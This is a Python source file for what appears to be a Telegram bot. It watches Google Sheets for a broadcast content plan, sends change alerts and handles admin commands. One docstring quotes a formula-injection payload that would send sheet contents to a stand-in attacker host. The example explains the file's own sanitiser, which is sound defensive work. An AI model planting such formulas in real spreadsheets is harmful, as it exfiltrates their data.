#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Poll Google Sheets and send Telegram notifications on content changes."""

import argparse
import csv
import fcntl
import datetime as _dt
import hashlib
import html
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from zoneinfo import ZoneInfo, ZoneInfoNotFoundError

import ae_content_plan
import ae_render_queue


def env_bool(name, default=False):
    value = os.environ.get(name)
    if value is None:
        return default
    return value.strip().lower() in {"1", "true", "yes", "y", "on"}


def env_int(name, default):
    value = os.environ.get(name)
    if value is None or not str(value).strip():
        return default
    try:
        return int(value)
    except ValueError:
        log("Некорректное значение {}={}, использую {}.".format(name, value, default))
        return default


def env_float(name, default):
    value = os.environ.get(name)
    if value is None or not str(value).strip():
        return default
    try:
        return float(str(value).replace(",", "."))
    except ValueError:
        return default


def load_time_zone(name, fallback_offset_hours):
    try:
        return ZoneInfo(name)
    except ZoneInfoNotFoundError:
        return _dt.timezone(_dt.timedelta(hours=fallback_offset_hours), name)


APP_NAME = "tg-pushes-TS26"
APP_VERSION = os.environ.get("TS26_APP_VERSION", "2026-07-26.01")
DEFAULT_DATA_DIR = Path(os.environ.get("SHEET_MONITOR_DATA_DIR") or os.environ.get("DATA_DIR") or "data").expanduser()
DEFAULT_STATE_PATH = DEFAULT_DATA_DIR / "sheet_state.json"
DEFAULT_SHEETS_PATH = Path(__file__).resolve().parent / "sheets.json"
DEFAULT_INTERVAL_SECONDS = int(os.environ.get("SHEET_MONITOR_INTERVAL", "120"))
CONTENT_PLAN_DELIVERY_RETRY_SECONDS = int(os.environ.get("CONTENT_PLAN_DELIVERY_RETRY_SECONDS", "300"))
DEFAULT_DURATION_SECONDS = int(os.environ.get("SHEET_MONITOR_DURATION_SECONDS", "0"))
DEFAULT_NOTIFY_INITIAL = env_bool("SHEET_MONITOR_NOTIFY_INITIAL", False)
DEFAULT_STARTUP_MESSAGE = env_bool("SHEET_MONITOR_STARTUP_MESSAGE", False)
DEFAULT_MACOS_NOTIFICATIONS = env_bool("SHEET_MONITOR_MACOS_NOTIFICATIONS", True)
DEFAULT_ADMIN_BUTTONS = env_bool("SHEET_MONITOR_ADMIN_BUTTONS", True)
DEFAULT_PLAQUE_FORM = env_bool("PLAQUE_FORM_ENABLED", True)
USER_AGENT = "tg-pushes-ts26-sheet-monitor/1.0"
MAX_CHANGE_MESSAGES = 12
MAX_MACOS_BODY_LENGTH = 220
MAX_TELEGRAM_MESSAGE_CHARS = 3800
CONTENT_PLAN_DIGEST_STATE_KEY = "_content_plan_hourly_digest"
CONTENT_PLAN_TIME_ZONE_NAME = os.environ.get("CONTENT_PLAN_TIME_ZONE", "Europe/Amsterdam")
CONTENT_PLAN_TIME_ZONE = load_time_zone(CONTENT_PLAN_TIME_ZONE_NAME, 1)
OPENAI_RESPONSES_URL = "https://api.openai.com/v1/responses"
GROQ_CHAT_COMPLETIONS_URL = "https://api.groq.com/openai/v1/chat/completions"
DEEPSEEK_CHAT_COMPLETIONS_URL = "https://api.deepseek.com/chat/completions"
YANDEX_DISK_RESOURCES_URL = "https://cloud-api.yandex.net/v1/disk/resources"
YANDEX_DISK_OUTPUT_ROOT = os.environ.get(
    "YANDEX_DISK_OUTPUT_ROOT",
    "disk:/Заставки ТС 2026/Трансляция/Динамика/04_ПЛАШКИ/Запись",
).strip()
YANDEX_DISK_PLATES_ENABLED = env_bool("YANDEX_DISK_PLATES_ENABLED", True)
PENDING_PLATE_LINKS_STATE_KEY = "_pending_plate_links"
TELEGRAM_QUOTE_START = "::quote"
TELEGRAM_QUOTE_END = "::endquote"
TELEGRAM_PARSE_MODE = "HTML"
DEFAULT_BOT_COMMANDS = [
    {"command": "start", "description": "Открыть бот"},
]
ADMIN_BOT_COMMANDS = [
    {"command": "start", "description": "Админ-панель"},
    {"command": "admin", "description": "Админ-панель"},
    {"command": "debug", "description": "Админ-панель"},
    {"command": "add", "description": "Добавить плашку"},
    {"command": "status", "description": "Статус монитора"},
    {"command": "recipients", "description": "Получатели"},
    {"command": "content_users", "description": "Доступ к Контент-плану"},
    {"command": "plaque_users", "description": "Доступ к плашкам"},
    {"command": "ae_sync", "description": "Обновить AE-ready"},
    {"command": "ae_status", "description": "Статус AE-ready"},
    {"command": "ae_link", "description": "Ссылка AE-ready"},
    {"command": "ae_warnings", "description": "Warnings AE-ready"},
    {"command": "ae_source", "description": "Источник Контент-плана"},
    {"command": "ae_rebuild", "description": "Пересоздать AE-ready"},
    {"command": "figma", "description": "Настройка Figma"},
    {"command": "render_status", "description": "Очередь рендера"},
    {"command": "render_retry", "description": "Повторить неудачные рендеры"},
    {"command": "google_access", "description": "Проверить Google-доступ"},
    {"command": "test_content", "description": "Тест Контент-план"},
    {"command": "test_recording", "description": "Тест План записи"},
    {"command": "preview_user", "description": "Превью пользователя"},
    {"command": "user_mode", "description": "Режим пользователя"},
]
AE_READY_STATE_KEY = "_ae_ready_content_plan"
AE_READY_SOURCE_URL = os.environ.get("AE_READY_SOURCE_URL", "")
AE_POSITION_REFERENCE_URL = os.environ.get("AE_POSITION_REFERENCE_URL", "")
AE_READY_SPREADSHEET_TITLE = os.environ.get("AE_READY_SPREADSHEET_TITLE", "TS26 AE-ready Content Plan")
AE_READY_CONFIDENCE_THRESHOLD = env_float("AI_CORRECTION_CONFIDENCE_THRESHOLD", 0.82)
AE_READY_PLAQUE_SYNC_ENABLED = env_bool("AE_READY_PLAQUE_SYNC_ENABLED", True)
AE_READY_PLAQUE_CONFIDENCE_THRESHOLD = env_float("AE_READY_PLAQUE_CONFIDENCE_THRESHOLD", 0.9)
AE_READY_PLAQUE_NOTE_TEXT = os.environ.get("AE_READY_PLAQUE_NOTE_TEXT", "<-- добавлено из AE-ready")
DIFF_BOUNDARY_CHARS = " \t,.;:!?-–—()[]{}«»\"'"
PLAQUE_SPREADSHEET_ID = os.environ.get("PLAQUE_SPREADSHEET_ID", "")
PLAQUE_WORKSHEET_GID = int(os.environ.get("PLAQUE_WORKSHEET_GID", "0"))
PLAQUE_WORKSHEET_TITLE = os.environ.get("PLAQUE_WORKSHEET_TITLE", "МОУШЕН")
PLAQUE_START_ROW = int(os.environ.get("PLAQUE_START_ROW", "280"))
PLAQUE_NAME_COL = int(os.environ.get("PLAQUE_NAME_COL", "1"))
PLAQUE_POSITION_COL = int(os.environ.get("PLAQUE_POSITION_COL", "2"))
PLAQUE_NOTE_COL = int(os.environ.get("PLAQUE_NOTE_COL", "5"))
PLAQUE_NOTE_TEXT = os.environ.get("PLAQUE_NOTE_TEXT", "<-- добавлено через ТГ бота")
AE_RENDER_ENABLED = env_bool("AE_RENDER_ENABLED", True)
AE_RENDER_TRIGGER_URL = os.environ.get("AE_RENDER_TRIGGER_URL", "").strip()
AE_RENDER_TRIGGER_TOKEN = os.environ.get("AE_RENDER_TRIGGER_TOKEN", "").strip()
_ae_render_queue_value = Path(os.environ.get("AE_RENDER_QUEUE_PATH", "data/ae_render_queue.json")).expanduser()
AE_RENDER_QUEUE_PATH = _ae_render_queue_value if _ae_render_queue_value.is_absolute() else Path(__file__).resolve().parent / _ae_render_queue_value
KEY_COLUMN_CANDIDATES = (
    "фио",
    "ф.и.о.",
    "имя",
    "спикер",
    "фио спикера",
    "участник",
    "время",
    "в/д",
    "дата",
)
HUMAN_FIELD_NAMES = {
    "должность": "должность",
    "регалии": "регалии",
    "фио": "ФИО",
    "ф.и.о.": "ФИО",
    "имя": "имя",
    "фото": "фото",
    "ссылка": "ссылка",
    "смена": "смена",
    "тема": "тема",
    "описание": "описание",
}


class MonitorError(Exception):
    pass


class ConfigError(Exception):
    pass


def now_text():
    return _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def moscow_now():
    return _dt.datetime.now(CONTENT_PLAN_TIME_ZONE)


def log(message):
    print("[{}] {}".format(now_text(), message), flush=True)


def load_dotenv(path):
    env_path = Path(path).expanduser()
    if not env_path.exists():
        return
    with open(env_path, "r", encoding="utf-8") as handle:
        for raw_line in handle:
            line = raw_line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, value = line.split("=", 1)
            key = key.strip()
            value = value.strip().strip('"').strip("'")
            if key and key not in os.environ:
                os.environ[key] = value


def split_env_list(value):
    return [item.strip() for item in re.split(r"[,;\s]+", str(value or "")) if item.strip()]


def normalize_space(value):
    return re.sub(r"\s+", " ", str(value or "").replace("\xa0", " ")).strip()


SHEET_FORMULA_PREFIXES = ("=", "+", "-", "@")


def sheet_safe_text(value):
    """Neutralize spreadsheet formula injection before writing user text to Sheets.

    Google Sheets evaluates any cell starting with = + - @ (or a control character
    followed by one of them). A user-supplied name such as
    ``=IMPORTXML("https://attacker/"&A1)`` would otherwise execute on open and can
    exfiltrate the sheet. Writes also use valueInputOption=RAW; this is defence in
    depth for the case where a cell is later copied into a formula-evaluating tool.
    """
    text = str(value or "")
    stripped = text.lstrip("\t\r\n ")
    if stripped[:1] in SHEET_FORMULA_PREFIXES:
        return "'" + text
    return text


def normalize_header(value):
    return normalize_space(value).casefold()


def google_sheet_export_url(url, range_name=""):
    text = str(url).strip()
    if not text:
        raise MonitorError("пустая ссылка Google Sheets")
    parsed = urllib.parse.urlparse(text)
    if "docs.google.com" not in parsed.netloc or "/spreadsheets/d/" not in parsed.path:
        return text
    match = re.search(r"/spreadsheets/d/([^/]+)", parsed.path)
    if not match:
        raise MonitorError("Не удалось найти ID Google Sheet в ссылке: {}".format(text))
    query = urllib.parse.parse_qs(parsed.query)
    gid = ""
    if "gid" in query and query["gid"]:
        gid = query["gid"][0]
    elif parsed.fragment:
        frag_match = re.search(r"(?:^|&)gid=([^&]+)", parsed.fragment)
        if frag_match:
            gid = frag_match.group(1)
    if not gid:
        gid = "0"
    query_params = {"format": "tsv", "gid": gid}
    if str(range_name or "").strip():
        query_params["range"] = str(range_name).strip()
    return "https://docs.google.com/spreadsheets/d/{}/export?{}".format(
        match.group(1),
        urllib.parse.urlencode(query_params),
    )


def count_rows(text):
    rows = list(csv.reader(text.splitlines(), delimiter="\t"))
    return len([row for row in rows if any(str(cell).strip() for cell in row)])


def parse_tsv(text):
    return list(csv.reader(text.splitlines(), delimiter="\t"))


def fetch_sheet(url, timeout, range_name=""):
    export_url = google_sheet_export_url(url, range_name=range_name)
    request = urllib.request.Request(export_url, headers={"User-Agent": USER_AGENT})
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            data = response.read()
            content_type = response.headers.get("Content-Type", "")
    except urllib.error.HTTPError as exc:
        raise MonitorError("HTTP {} при чтении таблицы".format(exc.code))
    except urllib.error.URLError as exc:
        raise MonitorError("не удалось подключиться: {}".format(exc.reason))
    except TimeoutError:
        raise MonitorError("таймаут чтения таблицы")
    if not data:
        raise MonitorError("Google вернул пустой ответ")
    prefix = data[:300].decode("utf-8", errors="replace").lstrip().lower()
    if prefix.startswith("<!doctype html") or prefix.startswith("<html"):
        raise MonitorError("Google вернул HTML вместо TSV; проверь доступ по ссылке")
    text = data.decode("utf-8-sig", errors="replace")
    rows = parse_tsv(text)
    return {
        "hash": hashlib.sha256(data).hexdigest(),
        "bytes": len(data),
        "rows": count_rows(text),
        "cells": rows,
        "content_type": content_type,
        "export_url": export_url,
    }


def position_reference_from_sheet(sheet):
    rows = sheet.get("cells") or []
    name_aliases = {"фио", "фио спикера", "фиоспикера", "имя", "спикер", "name"}
    position_aliases = {"должность", "регалии", "position", "title"}
    header_index = None
    name_index = None
    position_index = None
    for row_index, row in enumerate(rows[:30]):
        headers = [normalize_header(value) for value in row]
        candidate_name = next((index for index, value in enumerate(headers) if value in name_aliases), None)
        candidate_position = next((index for index, value in enumerate(headers) if value in position_aliases), None)
        if candidate_name is not None and candidate_position is not None:
            header_index = row_index
            name_index = candidate_name
            position_index = candidate_position
            break
    if header_index is None:
        raise MonitorError("В справочнике не найдены колонки ФИО и Должность.")

    positions = {}
    for row in rows[header_index + 1 :]:
        name = normalize_space(row[name_index] if name_index < len(row) else "")
        position = normalize_space(row[position_index] if position_index < len(row) else "")
        keys = ae_content_plan.person_name_keys(name)
        if not keys or not position:
            continue
        for key in keys:
            current = positions.setdefault(key, {"name": name, "positions": []})
            if position not in current["positions"]:
                current["positions"].append(position)

    return {
        key: {
            "name": item["name"],
            "position": item["positions"][0] if len(item["positions"]) == 1 else "",
            "ambiguous": len(item["positions"]) > 1,
        }
        for key, item in positions.items()
    }


def load_json(path, default):
    try:
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
            return data
    except FileNotFoundError:
        return default
    except (OSError, ValueError) as exc:
        raise ConfigError("Не удалось прочитать {}: {}".format(path, exc))


def load_state(path):
    data = load_json(path, {})
    return data if isinstance(data, dict) else {}


def save_state(path, state):
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp_path = path.with_suffix(path.suffix + ".tmp")
    # State holds chat ids, speaker names and cached sheet contents: keep it 0600
    # and write atomically so a crash mid-write cannot truncate it.
    descriptor = os.open(str(tmp_path), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    try:
        with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
            json.dump(state, handle, ensure_ascii=False, indent=2, sort_keys=True)
            handle.flush()
            os.fsync(handle.fileno())
    except Exception:
        try:
            os.unlink(str(tmp_path))
        except OSError:
            pass
        raise
    os.replace(str(tmp_path), str(path))


def acquire_state_lock(path):
    """Allow exactly one monitor to mutate a state file at a time."""
    path.parent.mkdir(parents=True, exist_ok=True)
    lock_path = path.with_suffix(path.suffix + ".lock")
    stream = lock_path.open("a+", encoding="utf-8")
    try:
        fcntl.flock(stream.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
    except OSError:
        stream.close()
        raise ConfigError("Монитор уже запущен для файла состояния: {}".format(path))
    return stream


def parse_sheet_arg(value):
    if "=" in value:
        label, url = value.split("=", 1)
        clean_url = clean_sheet_url(url)
        return {"label": label.strip() or clean_url, "url": clean_url}
    clean_url = clean_sheet_url(value)
    return {"label": clean_url, "url": clean_url}


def clean_sheet_url(value):
    text = str(value or "").strip()
    markdown = re.match(r"^\[\s*(https?://[^\]]+)\s*\]\(\s*(https?://[^)]+)\s*\)$", text)
    if markdown:
        return markdown.group(2).strip()
    return text


def normalize_sheet_config(item, index):
    if not isinstance(item, dict) or not item.get("url"):
        raise ConfigError("В sheets.json запись #{} должна содержать url.".format(index))
    clean_url = clean_sheet_url(item["url"])
    clean = {"label": item.get("label") or clean_url, "url": clean_url}
    if str(item.get("range") or "").strip():
        clean["range"] = str(item.get("range")).strip()
    if "chat_ids" in item:
        clean["chat_ids"] = [str(chat_id).strip() for chat_id in item.get("chat_ids") or [] if str(chat_id).strip()]
    if "extra_chat_ids" in item:
        clean["extra_chat_ids"] = [str(chat_id).strip() for chat_id in item.get("extra_chat_ids") or [] if str(chat_id).strip()]
    return clean


def load_sheets(args):
    env_sheets = os.environ.get("SHEETS_JSON", "").strip()
    if env_sheets:
        try:
            sheets = json.loads(env_sheets)
        except ValueError as exc:
            raise ConfigError("SHEETS_JSON не похож на JSON: {}".format(exc))
        if not isinstance(sheets, list):
            raise ConfigError("SHEETS_JSON должен быть JSON-массивом таблиц.")
        return [normalize_sheet_config(item, index) for index, item in enumerate(sheets, 1)]
    if args.sheet:
        return [parse_sheet_arg(item) for item in args.sheet]
    sheets = load_json(Path(args.sheets).expanduser(), [])
    if not isinstance(sheets, list):
        raise ConfigError("Файл таблиц должен быть JSON-массивом.")
    return [normalize_sheet_config(item, index) for index, item in enumerate(sheets, 1)]


def sheet_key(sheet):
    return google_sheet_export_url(sheet["url"], range_name=sheet.get("range", ""))


def telegram_request(token, method, payload, timeout):
    url = "https://api.telegram.org/bot{}/{}".format(token, method)
    data = urllib.parse.urlencode(payload).encode("utf-8")
    request = urllib.request.Request(url, data=data, headers={"User-Agent": USER_AGENT})
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            raw = response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        raise MonitorError("Telegram HTTP {}: {}".format(exc.code, body[:300]))
    except urllib.error.URLError as exc:
        raise MonitorError("Telegram недоступен: {}".format(exc.reason))
    try:
        parsed = json.loads(raw)
    except ValueError:
        raise MonitorError("Telegram вернул не JSON: {}".format(raw[:300]))
    if not parsed.get("ok"):
        raise MonitorError("Telegram ошибка: {}".format(parsed.get("description") or raw[:300]))
    return parsed


def get_required_telegram_token():
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    if not token:
        raise ConfigError("Заполните TELEGRAM_BOT_TOKEN в .env или окружении.")
    return token


def set_bot_commands_for_scope(args, token, commands, scope):
    payload = {
        "commands": json.dumps(commands, ensure_ascii=False),
        "scope": json.dumps(scope, ensure_ascii=False),
    }
    telegram_request(token, "setMyCommands", payload, args.timeout)


def configure_bot_commands(args):
    if args.no_telegram:
        return
    token = get_required_telegram_token()
    try:
        set_bot_commands_for_scope(args, token, DEFAULT_BOT_COMMANDS, {"type": "default"})
        for chat_id in admin_chat_ids():
            set_bot_commands_for_scope(args, token, ADMIN_BOT_COMMANDS, {"type": "chat", "chat_id": chat_id})
        log("Telegram-команды обновлены: default=start, admins={}".format(", ".join(admin_chat_ids()) or "нет"))
    except (MonitorError, ConfigError) as exc:
        log("Не удалось обновить меню Telegram-команд: {}".format(exc))


def print_chat_ids(args):
    token = get_required_telegram_token()
    data = telegram_request(token, "getUpdates", {}, args.timeout)
    results = data.get("result") or []
    if not results:
        log("Telegram не вернул сообщений. Напишите боту любое сообщение и запустите команду еще раз.")
        return
    seen = set()
    for item in results:
        message = item.get("message") or item.get("edited_message") or item.get("channel_post") or {}
        chat = message.get("chat") or {}
        chat_id = chat.get("id")
        if chat_id is None or chat_id in seen:
            continue
        seen.add(chat_id)
        title = chat.get("title") or chat.get("username") or "личный чат"
        log("chat_id: {} ({})".format(chat_id, title))


def default_chat_ids():
    chat_ids = split_env_list(os.environ.get("TELEGRAM_CHAT_IDS", ""))
    single_chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if single_chat_id:
        chat_ids.insert(0, single_chat_id)
    result = []
    for chat_id in chat_ids:
        if chat_id not in result:
            result.append(chat_id)
    return result


def is_content_plan_sheet(sheet):
    return normalize_header((sheet or {}).get("label", "")) == normalize_header("Контент-план")


def content_plan_chat_ids(state):
    chat_ids = state.setdefault("_content_plan_chat_ids", [])
    if not isinstance(chat_ids, list):
        state["_content_plan_chat_ids"] = []
    result = []
    for chat_id in state["_content_plan_chat_ids"]:
        chat_id = str(chat_id).strip()
        if chat_id and chat_id not in result:
            result.append(chat_id)
    state["_content_plan_chat_ids"] = result
    return result


def add_content_plan_chat_id(state, chat_id):
    chat_id = str(chat_id).strip()
    if not re.fullmatch(r"-?\d+", chat_id):
        raise ConfigError("chat_id должен быть числом.")
    chat_ids = content_plan_chat_ids(state)
    if chat_id not in chat_ids:
        chat_ids.append(chat_id)
    state["_content_plan_chat_ids"] = chat_ids
    return chat_id


def remove_content_plan_chat_id(state, chat_id):
    chat_id = str(chat_id).strip()
    chat_ids = content_plan_chat_ids(state)
    state["_content_plan_chat_ids"] = [item for item in chat_ids if item != chat_id]
    return chat_id


def content_plan_recipient_chat_ids(sheet=None, state=None):
    sheet = sheet or {}
    chat_ids = []
    chat_ids.extend(admin_chat_ids())
    chat_ids.extend(sheet.get("extra_chat_ids") or [])
    if state is not None:
        chat_ids.extend(content_plan_chat_ids(state))
    if sheet.get("chat_ids"):
        chat_ids.extend(sheet["chat_ids"])
    result = []
    for chat_id in chat_ids:
        chat_id = str(chat_id).strip()
        if chat_id and chat_id not in result:
            result.append(chat_id)
    return result


def known_chats(state):
    chats = state.setdefault("_known_chats", {})
    if not isinstance(chats, dict):
        state["_known_chats"] = {}
    return state["_known_chats"]


def remember_chat(state, chat):
    if not isinstance(chat, dict):
        return False
    chat_id = chat.get("id")
    if chat_id is None:
        return False
    chat_id = str(chat_id).strip()
    if not chat_id:
        return False
    title = chat.get("title") or " ".join([item for item in [chat.get("first_name"), chat.get("last_name")] if item]).strip()
    username = chat.get("username") or ""
    current = known_chats(state).get(chat_id, {})
    updated = {
        "title": normalize_space(title) or current.get("title", ""),
        "username": normalize_space(username) or current.get("username", ""),
        "type": chat.get("type") or current.get("type", ""),
        "seen_at": now_text(),
    }
    changed = current != updated
    known_chats(state)[chat_id] = updated
    return changed


def known_chat_label(chat_id, data):
    title = data.get("title") or "без имени"
    username = data.get("username")
    if username:
        return "{} (@{})".format(title, username)
    return title


def recipient_chat_ids(sheet=None, state=None):
    sheet = sheet or {}
    if is_content_plan_sheet(sheet):
        return content_plan_recipient_chat_ids(sheet, state=state)
    if sheet.get("chat_ids"):
        chat_ids = list(sheet["chat_ids"])
    else:
        chat_ids = default_chat_ids()
        chat_ids.extend(sheet.get("extra_chat_ids") or [])
    result = []
    for chat_id in chat_ids:
        chat_id = str(chat_id).strip()
        if chat_id and chat_id not in result:
            result.append(chat_id)
    return result


def admin_chat_ids():
    configured = split_env_list(os.environ.get("TELEGRAM_ADMIN_CHAT_IDS", ""))
    return configured or default_chat_ids()


def is_admin_chat_id(chat_id):
    return str(chat_id).strip() in admin_chat_ids()


def is_group_chat(chat):
    return str((chat or {}).get("type", "")).strip().lower() in {"group", "supergroup", "channel"}


def actor_ids(chat, from_user):
    """Return (chat_id, user_id) for an incoming update.

    Telegram sends both the chat the update happened in and the user who caused it.
    They are the same value in a private chat but differ in a group, so both are
    needed to make a correct authorization decision.
    """
    chat_id = (chat or {}).get("id")
    user_id = (from_user or {}).get("id")
    if chat_id is None:
        chat_id = user_id
    return chat_id, user_id


def is_authorized_actor(chat, from_user, allowed_check):
    """Authorize an update by chat AND, in groups, by the acting user.

    Checking only ``message.chat.id`` is unsafe: if an allow-listed id happens to be
    a group, every member of that group inherits the permission. In a group we
    therefore also require the individual sender to be allow-listed.
    """
    chat_id, user_id = actor_ids(chat, from_user)
    if chat_id is None:
        return False
    if not allowed_check(chat_id):
        return False
    if is_group_chat(chat):
        return user_id is not None and allowed_check(user_id)
    return True


def known_service_chat_ids(sheets, state=None):
    known = set(admin_chat_ids())
    known.update(default_chat_ids())
    for sheet in sheets:
        known.update(recipient_chat_ids(sheet, state=state))
    return {str(item).strip() for item in known if str(item).strip()}


def send_telegram(args, title, message, subtitle="", url="", sheet=None, state=None):
    if args.no_telegram:
        log("Telegram выключен: {} - {}".format(title, message))
        return
    token = get_required_telegram_token()
    chat_ids = recipient_chat_ids(sheet, state=state)
    if not chat_ids:
        raise ConfigError("Заполните TELEGRAM_CHAT_ID или TELEGRAM_CHAT_IDS в .env/окружении. chat_id можно узнать через --print-chat-ids.")
    send_telegram_to_chat_ids(args, chat_ids, title, message, subtitle=subtitle, url=url)


def send_telegram_to_chat_ids(args, chat_ids, title, message, subtitle="", url="", reply_markup=None):
    if args.no_telegram:
        log("Telegram выключен: {} - {}".format(title, message))
        return
    token = get_required_telegram_token()
    text = render_telegram_message(title, message, subtitle=subtitle, url=url)
    errors = []
    for chat_id in chat_ids:
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": TELEGRAM_PARSE_MODE,
            "disable_web_page_preview": "true" if env_bool("TELEGRAM_DISABLE_WEB_PAGE_PREVIEW", True) else "false",
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup, ensure_ascii=False)
        try:
            telegram_request(token, "sendMessage", payload, args.timeout)
            log("Telegram отправлен: chat_id={}, title={}".format(chat_id, title))
        except MonitorError as exc:
            errors.append("{}: {}".format(chat_id, exc))
    if errors:
        raise MonitorError("; ".join(errors))


def split_long_telegram_line(line):
    """Keep every character while making a single very long diff line sendable."""
    line = str(line or "")
    if len(line) <= 600:
        return [line]
    result = []
    remaining = line
    while remaining:
        if len(remaining) <= 600:
            result.append(remaining)
            break
        split_at = remaining.rfind(" ", 0, 600)
        if split_at < 200:
            split_at = 600
        result.append(remaining[:split_at].rstrip())
        remaining = remaining[split_at:].lstrip()
    return result


def telegram_message_chunks(title, message, subtitle="", url=""):
    """Split a rich Telegram message on source lines before HTML is rendered."""
    lines = []
    for raw_line in str(message or "").splitlines():
        lines.extend(split_long_telegram_line(raw_line))
    if not lines:
        return [(title, "", subtitle, url)]

    chunks = []
    current = []
    for line in lines:
        candidate = "\n".join(current + [line])
        candidate_url = url if not chunks else ""
        if current and len(render_telegram_message(title, candidate, subtitle=subtitle, url=candidate_url)) > MAX_TELEGRAM_MESSAGE_CHARS:
            chunks.append("\n".join(current))
            current = [line]
        else:
            current.append(line)
    if current:
        chunks.append("\n".join(current))

    result = []
    for index, chunk in enumerate(chunks):
        chunk_title = title if index == 0 else "{} (продолжение)".format(title)
        result.append((chunk_title, chunk, subtitle, url if index == 0 else ""))
    return result


def send_telegram_chunks_to_chat_ids(args, chat_ids, title, message, subtitle="", url=""):
    chunks = telegram_message_chunks(title, message, subtitle=subtitle, url=url)
    for chunk_title, chunk_message, chunk_subtitle, chunk_url in chunks:
        send_telegram_to_chat_ids(
            args,
            chat_ids,
            chunk_title,
            chunk_message,
            subtitle=chunk_subtitle,
            url=chunk_url,
        )
    return len(chunks)


def applescript_quote(value):
    text = str(value or "")
    return '"' + text.replace("\\", "\\\\").replace('"', '\\"') + '"'


def compact_notification_text(message, limit=MAX_MACOS_BODY_LENGTH):
    lines = [normalize_space(line) for line in str(message or "").splitlines()]
    text = " ".join([line for line in lines if line])
    if len(text) <= limit:
        return text
    return text[: limit - 1].rstrip() + "…"


def send_macos_notification(args, title, message, subtitle=""):
    if args.no_macos_notifications or sys.platform != "darwin":
        return False
    body = compact_notification_text(message)
    if not body:
        body = title
    command = [
        "display notification {}".format(applescript_quote(body)),
        "with title {}".format(applescript_quote(title)),
    ]
    if subtitle:
        command.append("subtitle {}".format(applescript_quote(subtitle)))
    script = " ".join(command)
    try:
        subprocess.run(["osascript", "-e", script], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
        log("macOS-уведомление отправлено: {}".format(title))
        return True
    except (OSError, subprocess.CalledProcessError) as exc:
        detail = exc.stderr.strip() if isinstance(exc, subprocess.CalledProcessError) and exc.stderr else str(exc)
        if not args.quiet:
            log("macOS-уведомление не отправлено: {}".format(detail))
        return False


def notify(args, title, message, subtitle="", url="", sheet=None, state=None):
    send_macos_notification(args, title, message, subtitle=subtitle)
    return try_send_telegram(args, title, message, subtitle=subtitle, url=url, sheet=sheet, state=state)


def try_send_telegram(args, title, message, subtitle="", url="", sheet=None, state=None):
    try:
        send_telegram(args, title, message, subtitle=subtitle, url=url, sheet=sheet, state=state)
        return True
    except (MonitorError, ConfigError) as exc:
        log("Не удалось отправить Telegram-сообщение: {}".format(exc))
        return False


def yandex_disk_request(path, token, method="GET", params=None, timeout=10):
    query = urllib.parse.urlencode(params or {})
    url = "{}{}{}".format(YANDEX_DISK_RESOURCES_URL, path, "?{}".format(query) if query else "")
    request = urllib.request.Request(
        url,
        headers={"Authorization": "OAuth {}".format(token), "User-Agent": USER_AGENT},
        method=method,
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            raw = response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        raise MonitorError("Яндекс.Диск HTTP {}: {}".format(exc.code, body[:300]))
    except urllib.error.URLError as exc:
        raise MonitorError("Яндекс.Диск недоступен: {}".format(exc.reason))
    try:
        payload = json.loads(raw) if raw else {}
    except ValueError:
        raise MonitorError("Яндекс.Диск вернул не JSON: {}".format(raw[:300]))
    if isinstance(payload, dict) and payload.get("error"):
        raise MonitorError("Яндекс.Диск: {}".format(payload.get("description") or payload.get("error")))
    return payload


def yandex_plate_name_key(value):
    text = normalize_space(value).casefold()
    text = re.sub(r"\.(mov|mp4)$", "", text)
    return re.sub(r"[^0-9a-zа-яё]+", "", text)


def yandex_plate_links(names, timeout=10):
    """Find and publish today's rendered plate files by speaker name."""
    token = os.environ.get("YANDEX_DISK_TOKEN", "").strip()
    if not YANDEX_DISK_PLATES_ENABLED or not token or not YANDEX_DISK_OUTPUT_ROOT:
        return {}, []
    wanted = {yandex_plate_name_key(name): normalize_space(name) for name in names if normalize_space(name)}
    if not wanted:
        return {}, []
    try:
        payload = yandex_disk_request(
            "/",
            token,
            params={"path": YANDEX_DISK_OUTPUT_ROOT, "limit": 1000, "offset": 0},
            timeout=timeout,
        )
        items = ((payload.get("_embedded") or {}).get("items") or [])
        links = {}
        for item in items:
            if item.get("type") != "file":
                continue
            name = str(item.get("name") or "")
            key = yandex_plate_name_key(name)
            matched_key = next(
                (wanted_key for wanted_key in wanted if key == wanted_key or key.endswith(wanted_key) or wanted_key.endswith(key)),
                None,
            )
            if not matched_key:
                continue
            public_url = str(item.get("public_url") or "").strip()
            path = str(item.get("path") or "").strip()
            if not public_url and path:
                try:
                    yandex_disk_request("/publish", token, method="PUT", params={"path": path}, timeout=timeout)
                    public_url = str(
                        yandex_disk_request("/", token, params={"path": path}, timeout=timeout).get("public_url") or ""
                    ).strip()
                except MonitorError:
                    continue
            if public_url:
                links[wanted[matched_key]] = public_url
        return links, []
    except MonitorError as exc:
        return {}, [str(exc)]


def current_day_marker(moment=None):
    moment = moment or moscow_now()
    return {moment.strftime("%d.%m"), "{}.{}".format(moment.day, moment.month)}


def current_day_change_details(sheet_label, previous, current, moment=None):
    """Return today's changed grid cells and speaker names for plate links."""
    previous_rows = previous.get("cells") or []
    current_rows = current.get("cells") or []
    if not previous_rows or not current_rows:
        return [], []
    marker = current_day_marker(moment)
    header_index = detect_header_row(current_rows)
    headers = headers_for(current_rows, header_index)
    key_col = detect_key_column(headers)
    pairs = [(row_index, row_index) for row_index in range(max(len(previous_rows), len(current_rows)))]
    messages = []
